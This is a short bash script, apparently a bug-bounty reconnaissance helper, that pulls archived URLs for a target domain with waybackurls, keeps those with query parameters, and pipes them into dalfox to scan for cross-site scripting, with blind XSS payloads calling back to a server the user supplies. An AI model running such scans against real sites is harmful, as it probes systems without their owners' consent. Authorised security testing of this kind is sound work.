#!/bin/bash

#This script assumes that you have following installed on your system : waybackurls, dalfox
#Usage : ./waybackXSS.sh <target.domain> <your blind xss server> 

echo $1 | waybackurls | grep "=" | grep -v ".jpg\|.png\|.css\|.js" | dalfox pipe -b $2 -o wayXSS-$1.txt
